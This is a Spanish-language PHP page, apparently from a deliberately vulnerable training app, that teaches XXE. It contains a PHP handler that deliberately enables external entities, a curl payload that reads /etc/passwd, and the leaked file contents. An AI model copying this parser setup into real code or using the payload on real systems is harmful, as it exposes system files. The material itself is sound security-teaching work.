<?php include("../../header.php"); ?>

<title>XXE</title>
<script src="script.js"></script>

<section id="template">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <h3 class="title text-center">XXE</h3>
            <div class="titleHR"><span></span></div>
          </div>
        </div>

        <p>XXE es un tipode vulnerabilidad que trata en atacar una aplicacion que analiza las entradas XML. Lo que permite poder inyectar codigo o ejecuciones dentro de esos XML, pudiendo acceder a contenido local o remoto de la aplicacion.</p>

        <p>Si un parser de XML acepta entidades externas como tipo DTD este podria leer archivos del sistema o realizar ataques de SSRF entre otros</p>

        <h2>Que ataques se pueden realizar:</h2>

        <ul>
            <li>Robo de datos sensibles (como usuarios y contraseñas)</li>
            <li>Falsificación de solicitudes del lado del servidor</li>
            <li>Denegación de servicio (ataque en el que se inhabilita el uso de un sistema, aplicación o dispositivo con el fin de que no esté disponible para los usuarios previstos)</li>
        </ul>

        <p>El codigo es el siguiente:</p>

        <h3>XML</h3>
        <pre>function XMLFunction&lpar;&rpar;&lcub;&NewLine;    var xml &equals; &apos;&apos; &plus;&NewLine;    &apos;&lt;&quest;xml version&equals;&quot;1&period;0&quot; encoding&equals;&quot;UTF-8&quot;&quest;&gt;&apos;&plus;&NewLine;    &apos;&lt;root&gt;&apos; &plus;&NewLine;    &apos;&lt;email&gt;&apos; &plus; &dollar;&lpar;&apos;&num;email&apos;&rpar;&period;val&lpar;&rpar; &plus; &apos;&lt;&sol;email&gt;&apos; &plus;&NewLine;    &apos;&lt;password&gt;&apos; &plus; &dollar;&lpar;&apos;&num;password&apos;&rpar;&period;val&lpar;&rpar; &plus; &apos;&lt;&sol;password&gt;&apos; &plus;&NewLine;    &apos;&lt;&sol;root&gt;&apos;&semi;&NewLine;    &NewLine;    var xmlhttp &equals; new XMLHttpRequest&lpar;&rpar;&semi;&NewLine;    xmlhttp&period;onreadystatechange &equals; function &lpar;&rpar; &lcub;&NewLine;    if&lpar;xmlhttp&period;readyState &equals;&equals; 4&rpar;&lcub;&NewLine;        console&period;log&lpar;xmlhttp&period;readyState&rpar;&semi;&NewLine;        console&period;log&lpar;xmlhttp&period;responseText&rpar;&semi;&NewLine;        document&period;getElementById&lpar;&apos;errorMessage&apos;&rpar;&period;innerHTML &equals; xmlhttp&period;responseText&semi;&NewLine;&NewLine;    &rcub;&NewLine;&rcub;&NewLine;xmlhttp&period;open&lpar;&quot;POST&quot;&comma;&quot;process&period;php&quot;&comma;true&rpar;&semi;&NewLine;xmlhttp&period;send&lpar;xml&rpar;&semi;&NewLine;&rcub;&semi;</pre>

        <h3>PHP</h3>
        <pre>&lt;&quest;php&NewLine;libxml&lowbar;disable&lowbar;entity&lowbar;loader &lpar;false&rpar;&semi;&NewLine;&dollar;xmlfile &equals; file&lowbar;get&lowbar;contents&lpar;&apos;php&colon;&sol;&sol;input&apos;&rpar;&semi;&NewLine;&dollar;dom &equals; new DOMDocument&lpar;&rpar;&semi;&NewLine;&dollar;dom-&gt;loadXML&lpar;&dollar;xmlfile&comma; LIBXML&lowbar;NOENT &verbar; LIBXML&lowbar;DTDLOAD&rpar;&semi;&NewLine;&dollar;info &equals; simplexml&lowbar;import&lowbar;dom&lpar;&dollar;dom&rpar;&semi;&NewLine;&dollar;email &equals; &dollar;info-&gt;email&semi;&NewLine;&dollar;password &equals; &dollar;info-&gt;password&semi;&NewLine;&NewLine;echo &quot;Lo siento&comma; &dollar;email ya esta registrado&excl;&quot;&semi;&NewLine;&quest;&gt;</pre>

        <p>Viendo el codigo podemos notar que el sitio de procesamiento recibe una entrada de xml el cual tiene el codigo de xml que va a parsear para posteriormente mostrar los resultados. Si inyectamos un codigo xml podr</p>

        <pre>curl &apos;http&colon;&sol;&sol;localhost&sol;vistas&sol;vulnerabilidades&sol;xxe&sol;process&period;php&apos; -X POST --data-raw &apos;&lt;&quest;xml version&equals;&quot;1&period;0&quot; encoding&equals;&quot;UTF-8&quot;&quest;&gt;&lt;&excl;DOCTYPE root &lsqb;&lt;&excl;ENTITY test SYSTEM &quot;file&colon;&sol;&sol;&sol;etc&sol;passwd&quot;&gt;&rsqb;&gt;&lt;root&gt;&lt;email&gt;&amp;test&semi;&lt;&sol;email&gt;&lt;password&gt;test&lt;&sol;password&gt;&lt;&sol;root&gt;&apos;</pre>

        <pre>Lo siento&comma; root&colon;x&colon;0&colon;0&colon;root&colon;&sol;root&colon;&sol;bin&sol;bash&NewLine;daemon&colon;x&colon;1&colon;1&colon;daemon&colon;&sol;usr&sol;sbin&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;bin&colon;x&colon;2&colon;2&colon;bin&colon;&sol;bin&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;sys&colon;x&colon;3&colon;3&colon;sys&colon;&sol;dev&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;sync&colon;x&colon;4&colon;65534&colon;sync&colon;&sol;bin&colon;&sol;bin&sol;sync&NewLine;games&colon;x&colon;5&colon;60&colon;games&colon;&sol;usr&sol;games&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;man&colon;x&colon;6&colon;12&colon;man&colon;&sol;var&sol;cache&sol;man&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;lp&colon;x&colon;7&colon;7&colon;lp&colon;&sol;var&sol;spool&sol;lpd&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;mail&colon;x&colon;8&colon;8&colon;mail&colon;&sol;var&sol;mail&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;news&colon;x&colon;9&colon;9&colon;news&colon;&sol;var&sol;spool&sol;news&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;uucp&colon;x&colon;10&colon;10&colon;uucp&colon;&sol;var&sol;spool&sol;uucp&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;proxy&colon;x&colon;13&colon;13&colon;proxy&colon;&sol;bin&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;www-data&colon;x&colon;33&colon;33&colon;www-data&colon;&sol;var&sol;www&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;backup&colon;x&colon;34&colon;34&colon;backup&colon;&sol;var&sol;backups&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;list&colon;x&colon;38&colon;38&colon;Mailing List Manager&colon;&sol;var&sol;list&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;irc&colon;x&colon;39&colon;39&colon;ircd&colon;&sol;var&sol;run&sol;ircd&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;gnats&colon;x&colon;41&colon;41&colon;Gnats Bug-Reporting System &lpar;admin&rpar;&colon;&sol;var&sol;lib&sol;gnats&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;nobody&colon;x&colon;65534&colon;65534&colon;nobody&colon;&sol;nonexistent&colon;&sol;usr&sol;sbin&sol;nologin&NewLine;systemd-timesync&colon;x&colon;100&colon;103&colon;systemd Time Synchronization&comma;&comma;&comma;&colon;&sol;run&sol;systemd&colon;&sol;bin&sol;false&NewLine;systemd-network&colon;x&colon;101&colon;104&colon;systemd Network Management&comma;&comma;&comma;&colon;&sol;run&sol;systemd&sol;netif&colon;&sol;bin&sol;false&NewLine;systemd-resolve&colon;x&colon;102&colon;105&colon;systemd Resolver&comma;&comma;&comma;&colon;&sol;run&sol;systemd&sol;resolve&colon;&sol;bin&sol;false&NewLine;systemd-bus-proxy&colon;x&colon;103&colon;106&colon;systemd Bus Proxy&comma;&comma;&comma;&colon;&sol;run&sol;systemd&colon;&sol;bin&sol;false&NewLine; ya esta registrado&excl;</pre>

    <br>
    <div id="registration">
        <h2>Crear cuenta</h2>
        <div id="RegisterUserForm">
            <fieldset>
                <p>
                <label for="email">Correo</label>
                <input id="email" name="email" type="email" class="text"
                value="" />
                </p>
                <p>
                <label for="password">Contrasena</label>
                <input id="password" name="password" class="text"
                type="password" />
                </p>
                <p><input id="acceptTerms" name="acceptTerms" type="checkbox"
                />
                <label for="acceptTerms">
                    Acepto los terminos y condiciones
                </label>
                </p>
                <p>
                <button id="registerNew"
                    onclick="XMLFunction()">Registrar</button>
                </p>
            </fieldset>
        </div>
    </div>
    <div id="errorMessage" color="red">
    </div>


    </div> <!--/.container -->
    </section> <!--/.contaier
    

<?php include("../../footer.php"); ?>